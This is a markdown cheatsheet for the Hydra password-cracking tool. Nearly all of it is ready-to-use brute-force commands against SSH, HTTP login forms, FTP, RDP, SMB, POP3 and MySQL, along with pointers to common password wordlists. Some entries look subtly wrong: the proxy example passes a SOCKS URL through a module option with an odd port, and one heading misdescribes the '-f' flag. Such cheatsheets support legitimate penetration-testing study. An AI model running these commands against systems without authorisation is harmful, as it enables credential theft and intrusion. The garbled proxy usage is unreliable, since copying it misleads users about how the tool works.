---
title: Hydra
tags:
  - hydra
  - cheatsheet
---

Hydra is a fast and flexible password-cracking tool that supports numerous protocols to attack various authentication services. It's widely used in penetration testing to perform brute-force attacks on login credentials.

## 1. Basic Usage

### 1.1 Brute-Force SSH Login

```bash
hydra -l username -P /path/to/passwords.txt ssh://192.168.1.1
# Attempts to brute-force SSH login using a username and password list.
```

### 1.2 Brute-Force HTTP Form Login

```bash
hydra -l admin -P /path/to/passwords.txt 192.168.1.1 http-form-post "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# Attempts to brute-force HTTP POST form with the specified parameters.
```

## 2. Common Protocols

### 2.1 FTP Brute-Force

```bash
hydra -l admin -P /path/to/passwords.txt ftp://192.168.1.1
# Brute-forces FTP login.
```

### 2.2 RDP Brute-Force

```bash
hydra -l administrator -P /path/to/passwords.txt rdp://192.168.1.1
# Brute-forces RDP login.
```

### 2.3 SMB Brute-Force

```bash
hydra -l admin -P /path/to/passwords.txt smb://192.168.1.1
# Brute-forces SMB login.
```

## 3. Advanced Options

### 3.1 Using a Username List

```bash
hydra -L /path/to/usernames.txt -p password ssh://192.168.1.1
# Uses a list of usernames with a single password.
```

### 3.2 Limit Connection Rate

```bash
hydra -l admin -P /path/to/passwords.txt -t 4 ssh://192.168.1.1
# Limits the number of parallel connections to 4.
```

### 3.3 Specify a Port

```bash
hydra -l admin -P /path/to/passwords.txt -s 2222 ssh://192.168.1.1
# Uses a non-default port (2222 in this case).
```

## 4. Output Options

### 4.1 Save Results to a File

```bash
hydra -l admin -P /path/to/passwords.txt ssh://192.168.1.1 -o results.txt
# Saves successful attempts to 'results.txt'.
```

### 4.2 Show Only Successful Attempts

```bash
hydra -l admin -P /path/to/passwords.txt ssh://192.168.1.1 -f
# Stops after finding the first valid password.
```

## 5. Advanced Brute-Forcing

### 5.1 Brute-Force POP3 Login

```bash
hydra -l admin -P /path/to/passwords.txt pop3://192.168.1.1
# Brute-forces POP3 login credentials.
```

### 5.2 Brute-Force MySQL Login

```bash
hydra -l root -P /path/to/passwords.txt mysql://192.168.1.1
# Attempts to brute-force MySQL login.
```

## 6. Proxy and Tuning

### 6.1 Use a Proxy

```bash
hydra -l admin -P /path/to/passwords.txt -o results.txt -s 8080 -m /proxy socks4://127.0.0.1:9050 ssh://192.168.1.1
# Routes connections through a SOCKS proxy.
```

### 6.2 Increase Verbosity

```bash
hydra -l admin -P /path/to/passwords.txt -V ssh://192.168.1.1
# Enables verbose mode to see each attempted login.
```

## 7. Useful Wordlists

- **SecLists**: [SecLists GitHub Repository](https://github.com/danielmiessler/SecLists)
- **RockYou**: Commonly used password list, often found pre-installed with Kali Linux.

## 8. References

- [Hydra GitHub Repository](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra/blob/master/README.md)
